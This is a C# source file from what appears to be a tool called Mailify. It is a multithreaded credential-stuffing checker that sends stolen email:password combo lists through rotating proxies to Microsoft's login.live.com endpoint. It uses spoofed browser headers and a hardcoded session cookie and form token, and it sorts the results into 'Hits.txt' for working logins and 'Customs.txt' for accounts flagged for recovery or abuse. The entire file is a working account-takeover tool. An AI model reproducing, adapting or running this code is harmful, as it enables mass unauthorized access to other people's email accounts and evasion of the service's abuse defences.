using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Hotmail
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    request.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    request.AddHeader("accept-encoding", "null");
                    request.AddHeader("accept-language", "en-US,en;q=0.9");
                    request.AddHeader("cache-control", "max-age=0");
                    request.AddHeader("content-length", "577");
                    request.AddHeader("content-type", "application/x-www-form-urlencoded");
                    request.AddHeader("cookie", "mkt=en-US; IgnoreCAW=1; MSCC=78.154.246.156-KW; MSPPre=c30e7cc3fc@firemailbox.club|209e2c9ba7f028c9||; MSPCID=209e2c9ba7f028c9; NAP=V=1.9&E=185a&C=YwJQ3-nJ3Oxms7ZqjKRPmeqfVlRl1_r70wln_ZOIIG3EyoRB16iTiA&W=2; ANON=A=45999FA1DB485D6EB926DA6BFFFFFFFF&E=18b4&W=2; SDIDC=CVuLKa5AIHJ5uwsBaOQt8nGLrmHZTYIsLuioHo6G0FNowfAcDMZkbAps9l0rcBGO540QWpXVPvUAcIQ1L7tlq06*97mj8ZAenWxDZuZRVsBTRVzzTnBfzvmhgDEo4xDK0aUQqANO3lggDjmIQkuueQtAlU*DfXR6rjEXlFsapFcCrsaYZoCXLgY*ou8MgnpDHUtA6Slww6NNLWwU!TdvMvo$; uaid=e94a49f177664960a3fca122edaf8a27; MSPOK=$uuid-5b220485-c233-4727-af20-52793217a373$uuid-029049e1-c2db-4c4e-83f1-7b736e9b8c34; wlidperf=FR=L&ST=1603778552344");
                    request.AddHeader("origin", "https://login.live.com");
                    request.AddHeader("referer", "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0");
                    request.AddHeader("sec-fetch-dest", "document");
                    request.AddHeader("sec-fetch-mode", "navigate");
                    request.AddHeader("sec-fetch-site", "same-origin");
                    request.AddHeader("sec-fetch-user", "?1");
                    request.AddHeader("upgrade-insecure-requests", "1");
                    request.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36");

                    var res0 = request.Post("https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1603778533&uaid=e94a49f177664960a3fca122edaf8a27&pid=0", "i13=0&login=" + credentials[0] + "&loginfmt=" + credentials[0] + "&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + credentials[1] + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DUFc1dzD7yfbc6p1hw0Cd65jSD5xqvLeZIGaSdFAY0DtnynhExxOcwym3FibChimglSUc8j4bxbFM8qQ0vCPRsAEM2U623Kd9OztNH%21NBFY20tDsPhoUIuEUzMmTHEKXUWGC5qFYjOglF6yw*T14eF4b9JjU0%21JvLg41z6jonbYfBwY7F8rot5MTOPKnxlyiM3rf0jyeGb4tqHwmwhKPYzA%24&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=18405", "application/x-www-form-urlencoded");
                    string text0 = res0.ToString();

                    if (text0.Contains("name=\"ANON\"") || text0.Contains("https://account.live.com/profile/accrue?mkt=") || text0.Contains($"sSigninName:'{credentials[0]}',bG:'https://login.live.com/gls.srf") || text0.Contains("name=\\\"t\\\" id=\\\"t\\\"") || text0.Contains("type=\"hidden\" name=\"t\" id=\"t\" value=\""))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text0.Contains("incorrect account or password.\",") || text0.Contains("timed out"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (text0.Contains("account.live.com/recover?mkt") || text0.Contains("recover?mkt") || text0.Contains("account.live.com/identity/confirm?mkt") || text0.Contains("Email/Confirm?mkt") || text0.Contains("/cancel?mkt=") || text0.Contains("/Abuse?mkt=") || text0.Contains("JavaScript required to sign in"))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}